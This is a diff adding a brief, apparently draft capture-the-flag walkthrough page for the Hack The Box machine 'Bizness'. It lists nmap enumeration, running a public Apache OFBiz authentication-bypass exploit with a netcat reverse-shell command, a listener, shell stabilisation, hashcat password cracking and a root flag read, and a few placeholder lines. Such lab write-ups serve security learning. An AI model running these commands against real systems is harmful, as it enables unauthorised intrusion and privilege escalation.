@@ -1,0 +1,99 @@
+---
+title: Bizness
+banner: /avatars/bizness.webp
+difficulty: easy
+os: linux
+releaseDate: 2023-01-06
+slug: "bizness"
+---
+
+import Browser from "@/components/browser.astro" 
+
+<br/>
+
+<Browser 
+  src="/example.png"
+  alt="imagen de ejemplo"
+/>
+
+## Enumeration
+
+```bash
+sudo nmap -p- -n -Pn --disable-arp-ping -sS -sV -sC -vvv -T5 10.10.11.252 -oN Bizness.nmap
+
+PORT      STATE SERVICE    REASON         VERSION
+22/tcp    open  ssh        syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+80/tcp    open  http       syn-ack ttl 63 nginx 1.18.0
+443/tcp   open  ssl/http   syn-ack ttl 63 nginx 1.18.0
+34361/tcp open  tcpwrapped syn-ack ttl 63
+```
+
+<br/>
+
+```bash
+echo "10.10.11.252 bizness.htb" | sudo tee -a /etc/hosts
+```
+
+<br/>
+
+```bash
+fuzzing
+```
+
+## Exploitation
+
+```bash
+git clone https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass.git
+cd Apache-OFBiz-Authentication-Bypass
+python3 exploit.py --url https://localhost:8443 --cmd 'nc -c bash 10.10.11.252 5000'
+```
+
+<br/>
+
+```bash
+nc -lvnp 5000
+```
+
+## Post Exploitation
+
+```bash
+script /dev/null -c bash
+```
+
+`ctrl+z`
+
+<br/>
+
+```bash
+stty raw -echo; fg
+```
+
+<br/>
+
+```bash
+reset xterm
+```
+
+<br/>
+
+```bash
+export TERM=xterm
+```
+
+##  Privilege escalation
+
+```bash
+hashcat -m 120 -a 0 -d 1 "**********:d" /usr/share/wordlists/rockyou.txt
+```
+
+<br/>
+
+```bash
+su root
+```
+
+<br/>
+
+```bash
+cat /root.txt
+```
